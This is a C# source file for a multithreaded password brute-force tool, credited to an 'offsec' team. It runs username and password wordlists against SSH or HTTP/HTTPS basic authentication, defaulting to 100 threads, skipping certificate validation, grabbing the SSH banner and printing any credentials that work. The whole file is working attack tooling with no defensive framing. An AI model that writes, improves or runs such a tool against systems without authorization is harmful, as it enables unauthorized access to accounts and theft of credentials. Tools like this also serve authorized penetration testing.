using Renci.SshNet;
using System.Net.Sockets;
using System.Text;
using System.Net.Http;
using System.Net;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Threading;

class AuthenticationResult
{
    public bool Success { get; set; }
    public bool ServiceAvailable { get; set; }
    public string Username { get; set; }
    public string Password { get; set; }
}

class Program
{
    private static int totalAttempts = 0;
    private static int successfulAttempts = 0;
    private static bool stopAllThreads = false;
    private static readonly object consoleLock = new object();
    private static int delayBetweenAttempts = 0;

    static async Task Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: bruteForce.exe <target> <usernameFile> <passwordFile> [-port <number>] [-delay <ms>] [-threads <number>] [--continue] [--http] [--https]");
            Console.WriteLine("Options:");
            Console.WriteLine("  --http     : Target is a web service (HTTP)");
            Console.WriteLine("  --https    : Target is a web service (HTTPS)");
            Console.WriteLine("  -port      : Specify custom port number");
            Console.WriteLine("  -delay     : Delay between attempts in milliseconds");
            Console.WriteLine("  -threads   : Number of threads to use (default: 100)");
            Console.WriteLine("  --continue : Continue after successful authentication");
            return;
        }

        string target = args[0];
        string usernameFile = args[1];
        string passwordFile = args[2];
        delayBetweenAttempts = 0;
        int threadCount = 100; // Default to 100 threads for maximum speed
        bool continueAfterSuccess = false;
        bool isHttp = false;
        bool isHttps = false;
        int port = 22;

        // Parse arguments
        for (int i = 3; i < args.Length; i++)
        {
            if (args[i] == "-delay" && i + 1 < args.Length)
            {
                delayBetweenAttempts = int.Parse(args[i + 1]);
                i++;
            }
            else if (args[i] == "-threads" && i + 1 < args.Length)
            {
                threadCount = int.Parse(args[i + 1]);
                i++;
            }
            else if (args[i] == "--continue")
            {
                continueAfterSuccess = true;
            }
            else if (args[i] == "--http")
            {
                isHttp = true;
                port = 80;
            }
            else if (args[i] == "--https")
            {
                isHttps = true;
                port = 443;
            }
            else if (args[i] == "-port" && i + 1 < args.Length)
            {
                port = int.Parse(args[i + 1]);
                i++;
            }
            else
            {
                Console.WriteLine("Unknown argument: " + args[i]);
                return;
            }
        }

        Console.WriteLine("\n\tDictionary brute force attack");
        Console.WriteLine("\n\tBy Hernan Rodriguez Team offsec Perú");
        Console.WriteLine("\t---------------------------------------------\n");

        // Load all usernames and passwords into memory for faster access
        var usernames = File.ReadAllLines(usernameFile);
        var passwords = File.ReadAllLines(passwordFile);

        if (isHttp || isHttps)
        {
            Console.WriteLine($"\n\tStarting brute force on web service at {(isHttps ? "https" : "http")}://{target}:{port}");
            Console.WriteLine($"\tUsing {threadCount} threads with {usernames.Length} usernames and {passwords.Length} passwords");
            Console.WriteLine($"\tTotal combinations: {usernames.Length * passwords.Length}\n");
        }
        else
        {
            Console.WriteLine("\n\tAttempting to retrieve SSH server banner for " + target + "...\n");
            string sshBanner = GetSshBanner(target);
            if (sshBanner != null)
            {
                Console.WriteLine("SSH Server banner: " + sshBanner);
            }
            else
            {
                Console.WriteLine("Failed to grab SSH server banner: Server did not respond with SSH protocol identification.");
                return;
            }
            Console.WriteLine($"\n\tStarting brute force on SSH service at {target}:{port}");
            Console.WriteLine($"\tUsing {threadCount} threads with {usernames.Length} usernames and {passwords.Length} passwords");
            Console.WriteLine($"\tTotal combinations: {usernames.Length * passwords.Length}\n");
        }

        // Create a queue of all credential combinations
        var credentialQueue = new BlockingCollection<(string, string)>();
        foreach (var username in usernames)
        {
            foreach (var password in passwords)
            {
                credentialQueue.Add((username, password));
            }
        }
        credentialQueue.CompleteAdding();

        // Start the timer
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Create and start worker threads
        var tasks = new List<Task>();
        for (int i = 0; i < threadCount; i++)
        {
            tasks.Add(Task.Run(() => WorkerThread(target, port, isHttp || isHttps, isHttps, credentialQueue, continueAfterSuccess)));
        }

        // Display progress periodically
        var progressTask = Task.Run(() => DisplayProgress(credentialQueue, usernames.Length * passwords.Length));

        // Wait for all threads to complete
        await Task.WhenAll(tasks);
        stopAllThreads = true;
        await progressTask;

        stopwatch.Stop();

        Console.WriteLine($"\n\nBrute force completed in {stopwatch.Elapsed.TotalSeconds:0.00} seconds");
        Console.WriteLine($"Total attempts: {totalAttempts}");
        Console.WriteLine($"Successful logins: {successfulAttempts}");

        if (successfulAttempts == 0)
        {
            Console.WriteLine("No valid credentials found.");
        }
    }

    static void WorkerThread(string target, int port, bool isWeb, bool isHttps, BlockingCollection<(string, string)> queue, bool continueAfterSuccess)
    {
        foreach (var (username, password) in queue.GetConsumingEnumerable())
        {
            if (stopAllThreads && !continueAfterSuccess)
                break;

            Interlocked.Increment(ref totalAttempts);

            AuthenticationResult result;
            if (isWeb)
            {
                result = WebConnection(target, port, username, password, isHttps);
            }
            else
            {
                result = SshConnection(target, username, password);
            }

            if (result.Success)
            {
                Interlocked.Increment(ref successfulAttempts);
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[SUCCESS] {username}:{password}");
                    Console.ResetColor();
                }

                if (!continueAfterSuccess)
                {
                    stopAllThreads = true;
                    break;
                }
            }

            if (delayBetweenAttempts > 0)
            {
                Thread.Sleep(delayBetweenAttempts);
            }
        }
    }

    static void DisplayProgress(BlockingCollection<(string, string)> queue, int totalCombinations)
    {
        while (!stopAllThreads)
        {
            int remaining = queue.Count;
            int attempted = totalCombinations - remaining;
            double progress = (double)attempted / totalCombinations * 100;

            lock (consoleLock)
            {
                Console.CursorLeft = 0;
                Console.Write($"Progress: {progress:0.00}% | Attempted: {attempted}/{totalCombinations} | Successes: {successfulAttempts}");
            }

            if (remaining == 0) break;
            Thread.Sleep(1000);
        }
    }

    static AuthenticationResult SshConnection(string target, string username, string password)
    {
        AuthenticationResult result = new AuthenticationResult
        {
            Username = username,
            Password = password
        };

        try
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                IAsyncResult asyncResult = tcpClient.BeginConnect(target, 22, null, null);
                bool success = asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                if (!success)
                {
                    result.ServiceAvailable = false;
                    return result;
                }
            }

            using (var client = new SshClient(target, username, password))
            {
                client.Connect();
                if (client.IsConnected)
                {
                    client.Disconnect();
                    result.Success = true;
                    result.ServiceAvailable = true;
                }
            }
        }
        catch (Exception)
        {
            result.Success = false;
            result.ServiceAvailable = true;
        }
        return result;
    }

    static AuthenticationResult WebConnection(string target, int port, string username, string password, bool isHttps)
    {
        AuthenticationResult result = new AuthenticationResult
        {
            Username = username,
            Password = password
        };

        try
        {
            var handler = new HttpClientHandler
            {
                Credentials = new NetworkCredential(username, password),
                PreAuthenticate = true,
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            using (var client = new HttpClient(handler))
            {
                client.Timeout = TimeSpan.FromSeconds(10);
                string protocol = isHttps ? "https" : "http";
                string url = $"{protocol}://{target}:{port}";

                try
                {
                    var response = client.GetAsync(url).Result;
                    result.ServiceAvailable = true;

                    if (response.IsSuccessStatusCode)
                    {
                        result.Success = true;
                        return result;
                    }

                    if (response.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        result.Success = false;
                        return result;
                    }
                }
                catch (Exception)
                {
                    result.ServiceAvailable = false;
                    return result;
                }
            }
        }
        catch (Exception)
        {
            result.Success = false;
            result.ServiceAvailable = false;
        }
        return result;
    }

    static string GetSshBanner(string target)
    {
        try
        {
            using (TcpClient client = new TcpClient(target, 22))
            {
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] data = new byte[2024];
                    StringBuilder responseBuilder = new StringBuilder();
                    int bytesRead;
                    while ((bytesRead = stream.Read(data, 0, data.Length)) > 0)
                    {
                        responseBuilder.Append(Encoding.ASCII.GetString(data, 0, bytesRead));
                        if (responseBuilder.ToString().Contains("\n"))
                        {
                            break;
                        }
                    }
                    return responseBuilder.ToString().Trim();
                }
            }
        }
        catch (Exception)
        {
            return null;
        }
    }
}